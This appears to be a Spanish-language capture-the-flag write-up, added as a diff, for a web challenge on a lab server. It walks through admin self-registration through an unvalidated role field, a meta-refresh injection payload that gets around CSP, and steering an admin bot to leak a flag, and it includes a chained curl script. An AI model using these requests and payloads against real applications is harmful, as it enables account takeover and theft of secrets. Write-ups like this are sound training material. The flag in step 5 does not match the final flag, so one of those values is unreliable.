@@ -1,0 +1,164 @@
+---
+title: "Operación DataStream: Infiltración en el Monitor de Tráfico (500)"
+---
+
+## Descripción del Reto
+
+El sistema **"Secure Data Access Terminal"** es una plataforma interna de monitoreo donde los operadores pueden crear registros de datos (DATA-LOGs). El administrador ha ocultado una flag que solo puede ser obtenida explotando vulnerabilidades en el sistema.
+
+**URL objetivo:** `http://172.210.57.123:8004`
+
+---
+
+## Análisis de Vulnerabilidades
+
+### 1. Registro sin Validación de Rol (Crítico)
+El endpoint `/register` no valida correctamente el campo `role`, permitiendo a cualquier usuario registrarse como administrador.
+
+### 2. Cross-Site Scripting (XSS) en DATA-LOGs
+El contenido de los logs se renderiza sin la sanitización adecuada, permitiendo la ejecución de código JavaScript.
+
+### 3. Bot Administrativo con Privilegios
+El bot tiene acceso a la flag a través de una cookie y puede ser dirigido a visitar cualquier URL interna.
+
+---
+
+## Explotación Paso a Paso
+
+### Paso 1: Registrarse como Administrador
+
+```bash
+# Registrar usuario con rol de administrador
+curl -X POST http://172.210.57.123:8004/register \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=adminuser&password=adminpass&role=admin"
+```
+
+**Explicación:** El parámetro `role=admin` no está validado en el backend, permitiéndonos crear una cuenta con privilegios de administrador directamente.
+
+---
+
+### Paso 2: Iniciar Sesión y Obtener Token
+
+```bash
+# Iniciar sesión y guardar cookies
+curl -X POST http://172.210.57.123:8004/login \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=adminuser&password=adminpass" \
+  -c cookies.txt -v
+```
+
+**Explicación:** Al iniciar sesión, el servidor devuelve un token JWT en las cookies que autentica nuestra sesión como administrador. Guardamos las cookies en `cookies.txt` para requests futuros.
+
+---
+
+### Paso 3: Crear DATA-LOG con Payload XSS
+
+```bash
+# Crear DATA-LOG con payload de redirección
+curl -i -X POST http://172.210.57.123:8004/data-logs \
+  -b cookies.txt \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "content=<meta http-equiv=refresh content='0;url=http://localhost:3000/core-dump'>"
+```
+
+**Respuesta esperada:**
+
+```text
+HTTP/1.1 302 Found
+Location: /data-log/c340fd49-bdbf-43df-95cc-2c429d32b2c3
+```
+
+**Explicación:**
+
+- El payload `<meta http-equiv=refresh>` evade las restricciones de CSP
+- Cuando el bot visite esta página, será redirigido automáticamente a `/core-dump`
+- El ID del log (`c340fd49-bdbf-43df-95cc-2c429d32b2c3`) se obtiene del header `Location`
+
+---
+
+### Paso 4: Ejecutar el Bot Administrativo
+
+```bash
+# Enviar el bot a visitar nuestro DATA-LOG
+curl -X POST http://172.210.57.123:8004/dispatch \
+  -b cookies.txt \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "path=http://localhost:3000/data-log/c340fd49-bdbf-43df-95cc-2c429d32b2c3"
+```
+
+**Explicación:** El endpoint `/dispatch` solo está disponible para administradores y fuerza al bot a visitar nuestra URL maliciosa.
+
+---
+
+### Paso 5: Recuperar la Flag
+
+```bash
+# Ver el contenido actualizado del DATA-LOG
+curl http://172.210.57.123:8004/data-log/c340fd49-bdbf-43df-95cc-2c429d32b2c3
+```
+
+**Resultado esperado:** El contenido del log ahora incluirá la flag:
+
+```html
+<div style="background:#1a1a1a; padding:15px; border: 1px dashed var(--color-secondary); color: var(--color-text-light);">
+    [ACCESS GRANTED] SECURE SYSTEM SECRET: ikerlan{meta_refresh_xss_to_flag}
+</div>
+```
+
+---
+
+## Mecanismo Técnico Detallado
+
+### Flujo de la Explotación
+
+1. **Registro como Admin** → Bypass de control de acceso
+2. **Inyección XSS** → Ejecución de código en contexto del bot
+3. **Redirección a /core-dump** → El bot accede al endpoint privilegiado
+4. **Escritura de Flag** → `/core-dump` escribe la flag en nuestro log
+5. **Lectura de Flag** → Recuperamos la flag del DATA-LOG
+
+### Por qué funciona el Payload
+
+- **CSP Bypass:** La política de seguridad permite `meta refresh`
+- **Cookie del Bot:** El bot tiene la cookie `session_secret` con acceso a la flag
+- **Endpoint /core-dump:** Requiere la cookie especial y escribe la flag
+
+---
+
+## Comandos Completos en una Secuencia
+
+```bash
+# 1. Registro como admin
+curl -X POST http://172.210.57.123:8004/register -d "username=adminuser&password=adminpass&role=admin"
+
+# 2. Login y guardar cookies
+curl -X POST http://172.210.57.123:8004/login -d "username=adminuser&password=adminpass" -c cookies.txt
+
+# 3. Crear DATA-LOG malicioso
+RESPONSE=$(curl -i -s -X POST http://172.210.57.123:8004/data-logs -b cookies.txt -d "content=<meta http-equiv=refresh content='0;url=http://localhost:3000/core-dump'>")
+LOG_ID=$(echo "$RESPONSE" | grep -i "location:" | sed 's/.*\/data-log\///' | tr -d '\r\n')
+
+# 4. Ejecutar bot
+curl -X POST http://172.210.57.123:8004/dispatch -b cookies.txt -d "path=http://localhost:3000/data-log/$LOG_ID"
+
+# 5. Obtener flag
+curl http://172.210.57.123:8004/data-log/$LOG_ID
+```
+
+---
+
+## Lecciones de Seguridad
+
+1. ✅ Validar todos los campos de entrada, especialmente roles y privilegios
+2. ✅ Implementar sanitización robusta para contenido HTML
+3. ✅ Restringir el acceso a endpoints críticos con múltiples capas de autenticación
+4. ✅ Revisar políticas CSP para evitar bypasses con tags HTML alternativos
+
+---
+
+## Flag Obtenida
+
+```text
+ikerlan{l0l_y0u_4r3_4n_1ncr3d1bl3_w3b_3xp10!t3r}
+```
